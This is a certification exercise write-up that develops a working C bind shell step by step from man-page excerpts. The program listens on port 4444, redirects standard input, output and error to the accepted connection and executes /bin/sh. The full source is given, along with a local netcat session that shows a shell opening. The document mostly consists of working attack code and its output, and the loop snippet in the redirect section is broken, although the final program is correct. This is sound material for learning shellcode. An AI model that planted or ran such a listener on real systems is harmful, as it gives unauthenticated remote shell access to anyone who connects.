# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 14183.

# Exo 2 - Reverse shellcode - Part 1 - C Bind Shell

### *int main()*

For this first exercise lets start by developping a C bind shell. Steps are:

  * Create a socket
  * Bind the socket
  * Listen on a defined port
  * Accept connection
  * Redirect stdin/stdout/stderr
  *  Run /bin/sh

For each step, **man** is used in order to find usage description of functions.

### Socket

The first step is to create a socket which will be used to listen on.
```C
SYNOPSIS
        #include <sys/types.h>
        #include <sys/socket.h>
        int socket(int domain, int type, int protocol);

DESCRIPTION
        The domain argument specifies a communication domain; 
        AF_INET             IPv4 Internet protocols          ip(7)
 
        SOCK_STREAM     Provides sequenced, reliable, two-way, connection-based byte streams.  An out-of-band data transmission mechanism may be supported.
 
        The  protocol  specifies  a  particular  protocol  to  be used with the socket.  Normally only a single protocol exists to support a particular socket  type within a given protocol family, in which case protocol can be specified as 0. 
```

Our C code is:

```
int my_socket = socket(AF_INET, SOCK_STREAM, 0);
```

### Bind
Then socket must be bind. 

```
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
  * *sockfd* is the socket we created, 
  * *addrlen* is len of *addr*
 addrlen specifies the size, in bytes, of the address structure pointed to by addr.
   * addr is a specific structure

The sockaddr structure myst contain:

  * the family: *AF_INET*
  * the address to listen: *INADDR_ANY*
  * the port to bind.

In order to format the port number, htons must be used:

```
       The htons() function converts the unsigned short integer hostshort from host byte order to network byte order.
```

The bind part is:
```
struct sockaddr_in my_sockaddr;
my_sockaddr.sin_family = AF_INET;
my_sockaddr.sin_addr.s_addr = INADDR_ANY;
my_sockaddr.sin_port = htons(4444);
bind(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));
```
### Listen

Lets start listening.

```
SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int listen(int sockfd, int backlog);

DESCRIPTION
       The  backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.
```
C code is:

```
listen(my_socket, 0);
```

### Accept

Then, connections must be accepted.

```
SYNOPSIS
       #include <sys/types.h>           /* See NOTES */
       #include <sys/socket.h>

       int accept(int sockfd, struct sockaddr *adresse, socklen_t *longueur); 
```

C code:

```
int my_accept = accept(my_socket, NULL, NULL);
```

### Redirect

Before executing our shell we need to redirect stdin, stdout and stderr to our socket. Again, lets use the man.

```
#include <unistd.h>
int dup3(int oldfd, int newfd, int flags);
```

As a remember, file descriptor are (https://en.wikipedia.org/wiki/File_descriptor):

  * 0 for standard input (STDIN)
  * 1 for standard output (STDOUT)
  * 2 for standard error (STDERR)

Our code may be:

```
dup2(my_accept, 0);
dup2(my_accept, 1);
dup2(my_accept, 2);
```

Regarding C code, using a for loop do not have a huge interest, but as its for shellcoding purposes, lets use a for loop:

```
int i;
for(i = 0; i++; i <3)
	dup2(my_accept, i);
```

### Execve

At last we can finnaly call execve:
```
SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```

```
execve("/bin/sh", NULL, NULL);
```
### Code

Lets try to compile it by removing the includes one by one in order to remove unecessary include. Finally there is a C Bind Shell:

```
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int my_socket = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in my_sockaddr;
	my_sockaddr.sin_family = AF_INET;
    	my_sockaddr.sin_addr.s_addr = INADDR_ANY;
    	my_sockaddr.sin_port = htons(4444);
	bind(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));

	listen(my_socket, 0);

	int my_accept = accept(my_socket, NULL, NULL);

	int i;
	for(i = 0; i < 3; i++)
		dup2(my_accept, i);

	execve("/bin/sh", NULL, NULL);

	return 0;
}
```

### Usage

In a first terminal:

```
cervoise@slae:~/exam/bind$ gcc bind_shell.c -o bind_shell cervoise@slae:~/exam/bind$ ./bind_shell
```
```
cervoise@slae:~/slae/Shellcode$ netstat -laput |grep bind_shell
[...]
tcp        0      0 *:4444                  *:*                     LISTEN      21884/bind_shell   
[...]
cervoise@slae:~/slae/Shellcode$ nc 127.0.0.1 4444
id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
exit
cervoise@slae:~/slae/Shellcode$ nc 127.0.0.1 4454
$ id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
```
